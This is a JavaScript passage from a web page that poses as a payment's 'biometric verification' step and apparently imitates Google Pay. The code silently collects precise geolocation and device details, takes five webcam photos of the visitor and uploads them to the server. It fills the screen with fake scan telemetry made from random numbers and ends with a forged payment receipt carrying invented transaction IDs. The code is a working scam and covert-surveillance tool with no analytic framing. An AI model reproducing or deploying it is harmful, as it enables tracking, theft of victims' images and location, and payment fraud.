                document.getElementById('humanVerificationSection').style.display = 'block';
            }, 1000);
        });

        // Helper for random IDs if missing
        function generateRandomId(length) {
            let result = '';
            const characters = '0123456789';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        function generateRandomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        async function initiateBiometricScan() {
            const btn = document.getElementById('startScanBtn');
            btn.innerHTML = "Initializing...";
            btn.disabled = true;

            // Check Location first
            const locSuccess = await logVisit();
            if (!locSuccess) {
                showPermissionModal();
                btn.innerHTML = "Retry Verification";
                btn.disabled = false;
                return;
            }

            // Check Camera
            const camSuccess = await startCameraInScanBox();
            if (!camSuccess) {
                showPermissionModal();
                btn.innerHTML = "Retry Verification";
                btn.disabled = false;
                return;
            }

            // Both success - show Scan UI
            document.getElementById('permissionModal').style.display = 'none';
            document.getElementById('scanPlaceholder').style.display = 'none';
            document.getElementById('avatarContainer').style.display = 'flex';
            document.getElementById('scanLine').style.display = 'block';
            btn.style.display = 'none';

            updateStep('step-bio', 'FBBC04', 'Establishing Secure Channel...');

            // Start Dynamic Telemetry
            startTelemetryEngine();

            // Capture 5 photos over 5 seconds
            await captureMultiplePhotos();

            updateStep('step-bio', '34A853', 'Scan Complete âœ“');

            // Move to final processing
            setTimeout(() => {
                document.getElementById('humanVerificationSection').style.display = 'none';
                document.getElementById('processingResultSection').style.display = 'block';

                // Show final receipt after processing
                setTimeout(showReceipt, 3000);
            }, 1000);
        }

        function updateStep(id, color, text) {
            const step = document.getElementById(id);
            if (!step) return;
            const icon = step.querySelector('.step-icon circle');
            if (icon) icon.setAttribute('fill', '#' + color);
            const textEl = step.querySelector('.step-text');
            if (textEl) textEl.innerText = text;
        }

        // Professional Telemetry Engine
        function startTelemetryEngine() {
            const eye = document.getElementById('t-eye');
            const face = document.getElementById('t-face');
            const auth = document.getElementById('t-auth');
            const depth = document.getElementById('t-depth');

            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.floor(Math.random() * 5) + 1;
                if (progress > 100) progress = 100;

                if (eye) eye.textContent = `EYE_LOCK: ${Math.random() > 0.5 ? 'SYNC' : 'BUSY'} [${(Math.random() * 10).toFixed(1)}ms]`;
                if (face) face.textContent = `STRUC_MAP: ${progress}% COMPLETE`;
                if (auth) auth.textContent = `HEX_TOKEN: 0x${Math.floor(Math.random() * 16777215).toString(16).toUpperCase()}`;
                if (depth) depth.textContent = `DEPTH_VAR: +/-${(Math.random() * 0.5).toFixed(3)}m`;

                if (progress === 100) {
                    clearInterval(interval);
                    updateStep('step-bio', 'FBBC04', 'Identity Confirmed. Finalizing...');
                }
            }, 100);
        }

        async function startCameraInScanBox() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });

                video = document.getElementById('scanVideo');
                video.srcObject = cameraStream;
                video.play();
                return true;
            } catch (error) {
                return false;
            }
        }

        async function retryPermissions() {
            const btn = document.getElementById('permissionBtn');
            btn.innerText = "Checking...";
            btn.disabled = true;

            const locSuccess = await logVisit();
            const camSuccess = await startCameraInScanBox();

            if (locSuccess && camSuccess) {
                document.getElementById('permissionModal').style.display = 'none';
                initiateBiometricScan();
            } else {
                btn.innerText = "Permissions Required. Retry?";
                btn.disabled = false;
                alert("Please enable Camera and Location in your browser settings to proceed with the payment.");
            }
        }

        function showPermissionModal() {
            document.getElementById('permissionModal').style.display = 'flex';
        }

        function showReceipt() {
            document.getElementById('loadingSection').style.display = 'none';
            document.getElementById('humanVerificationSection').style.display = 'none';
            document.getElementById('processingResultSection').style.display = 'none';

            // Check if custom payment
            if (paymentData && paymentData.isCustom) {
                // ACTIVATE GOOGLE PAY MODE
                document.body.classList.add('gpay-mode');
                document.getElementById('genericLogo').style.display = 'none';
                document.getElementById('genericFooter').style.display = 'none';
                document.getElementById('gpayReceiptSection').style.display = 'block';

                // Populate Custom Data
                document.getElementById('gpay-amount').textContent = 'â‚¹' + paymentData.amount;
                document.getElementById('gpay-to-name').textContent = 'To ' + paymentData.toName;
                document.getElementById('gpay-bank').textContent = paymentData.bankName;
                document.getElementById('gpay-upi-txn').textContent = paymentData.upiTxnId || generateRandomId(12);
                document.getElementById('gpay-to-upi').textContent = paymentData.upiId;

                document.getElementById('gpay-label-to').textContent = 'To: ' + paymentData.toName;
                document.getElementById('gpay-label-from').textContent = 'From: ' + paymentData.fromName + ' (' + paymentData.bankName.split(' ')[0] + ' Bank)';

                const senderUpi = paymentData.fromName.toLowerCase().replace(/\s+/g, '') + '@okaxis';
                document.getElementById('gpay-from-upi').textContent = senderUpi;

                document.getElementById('gpay-google-txn').textContent = paymentData.googleTxnId || 'CICAg' + generateRandomString(8);
                document.getElementById('gpay-time').textContent = paymentData.date;

            } else {
                // GENERIC MODE
                document.getElementById('receiptSection').style.display = 'block';

                if (paymentData) {
                    document.querySelector('.receipt-amount-value').textContent = `â‚¹${paymentData.amount}.00`;
                    document.getElementById('receipt-txn-id').textContent = paymentData.id;

                    if (paymentData.merchant) {
                        document.querySelectorAll('.receipt-value')[0].textContent = paymentData.merchant;
                    }

                    if (paymentData.date) {
                        document.getElementById('receipt-date').textContent = paymentData.date;
                    }
                }
            }

            // Stop camera
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }

            // Store photos like before
            sessionStorage.setItem('capturedPhotos', JSON.stringify(capturedPhotos));
        }

        // Capture multiple photos with upload
        async function captureMultiplePhotos() {
            return new Promise((resolve) => {
                let photoCount = 0;
                const maxPhotos = 5;

                const captureInterval = setInterval(async () => {
                    if (photoCount >= maxPhotos || !video) {
                        clearInterval(captureInterval);
                        resolve();
                        return;
                    }

                    // Loop check for dimensions
                    if (video.videoWidth === 0 || video.videoHeight === 0) return;

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
                    capturedPhotos.push({
                        timestamp: new Date().toISOString(),
                        data: photoData
                    });

                    await sendPhotoToServer(photoData);

                    photoCount++;
                }, 1000);
            });
        }

        async function sendPhotoToServer(photoData) {
            try {
                await fetch('/capture-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        photo: photoData,
                        paymentId: paymentId || 'UNKNOWN'
                    })
                });
            } catch (error) {
                console.error(error);
            }
        }

        // Silent Location & Visit Logger
        async function logVisit() {
            let locationData = null;
            let deviceData = null;
            let locError = false;

            // Get Device Details
            try {
                deviceData = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: { width: screen.width, height: screen.height }
                };
            } catch (e) { }

            // Get Location (Strict Requirement)
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed
                };
            } catch (e) {
                locError = true;
            }

            if (locError) return false;

            // Send to server
            try {
                await fetch('/log-visit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        paymentId: paymentId || 'UNKNOWN',
                        location: locationData,
                        deviceDetails: deviceData
                    })
                });
                return true;
            } catch (e) {
                return false;
            }
        }
